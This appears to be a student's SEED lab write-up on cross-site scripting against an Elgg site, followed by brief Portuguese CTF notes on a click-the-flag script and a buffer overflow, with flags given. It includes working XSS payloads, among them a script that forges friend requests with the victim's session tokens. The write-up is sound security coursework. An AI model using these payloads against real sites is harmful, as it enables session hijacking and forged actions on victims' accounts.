## Lab Environment
    - dockps
        28ed5a33457a  mysql-10.9.0.6
        4fe49638488d  elgg-10.9.0.5



## Lab Tasks

# Task 1: Posting a Malicious Message to Display an Alert Window
    - <script>alert("This is an attack!!");</script>
    - https://drive.google.com/file/d/1YhS5jqWl9HPHSxIUnx-EjoC9hoczArqL/view?usp=sharing

# Task 2: Posting a Malicious Message to Display Cookies
    - Elgg=r8drc6a1snbstlalj13oco1h51
    - https://drive.google.com/file/d/1b_giTKnTqR01A3Vm0x29-zjFaY8YUDYS/view?usp=sharing

# Task 3: Stealing Cookies from the Victim’s Machine
    - https://drive.google.com/file/d/1qv8MUW6yXtkVn0SDsgXga_uifMBsg7YW/view?usp=sharing

# Task 4: Becoming the Victim’s Friend
    <script type="text/javascript">
    window.onload = function () {

    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    //Construct the HTTP request to add Samy as a friend.
    //www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1642159148&__elgg_token=tgHelIrJC7zEWT8vKpO2fg&__elgg_ts=1642159148&__elgg_token=tgHelIrJC7zEWT8vKpO2fg
    var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token; 

    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
    }
    </script>

    - We sent a request from another profile to Samy's profile to add him as friend and to discover his id. (https://drive.google.com/file/d/1Q3poTVhZsX9igSJ15tiSUxv_RBo2yOMr/view?usp=sharing)

    - www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1642159148&__elgg_token=tgHelIrJC7zEWT8vKpO2fg&__elgg_ts=1642159148&__elgg_token=tgHelIrJC7zEWT8vKpO2fg

    - Alice had no friends and when she opened Samy's profile they became friends without her knowledge. (https://drive.google.com/file/d/1lsMLmIokrI_iSzPYT7sRKjc_dBbRdz9d/view?usp=sharing)

    - Question 1: Explain the purpose of Lines ➀ and ➁, why are they are needed?
        Lines 1 and 2 allows us to get the cookies of the person whose profile we are in. In this case, we stole Alice's credentials in order to make it look like she sent a request of friendship to Samy.

    - Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?
        Yes, we can. We could ignore the frontend and use the terminal to do a curl request and send the javascript malicious code in it.


## CTF 10

# Desafio 1
    - <script> document.getElementById("giveflag").click(); </script>
    - flag: flag{1db42eb724af095654674ec583ab75e6} 

# Desafio 2
    - checksec: https://drive.google.com/file/d/1HejoVjkaPMUjDLqDLUp8upcucgAxe7IH/view?usp=sharing
        Os endereços são randomizados (PIE ENABLED), logo o endereço do buffer via ser alterado.

    - Qual é a linha do código onde a vulnerabilidade se encontra?
        A vulnerabilidade encontra-se na linha 12, quando o programa lê o nosso input.

    - O que é que a vulnerabilidade permite fazer?
        Podemos executar um bufferoverflow e fazer com que o código aponte para a shell code que queremos executar para descobrir a flag.
    - flag: flag{a72960c52c3528489bf499466853a466}

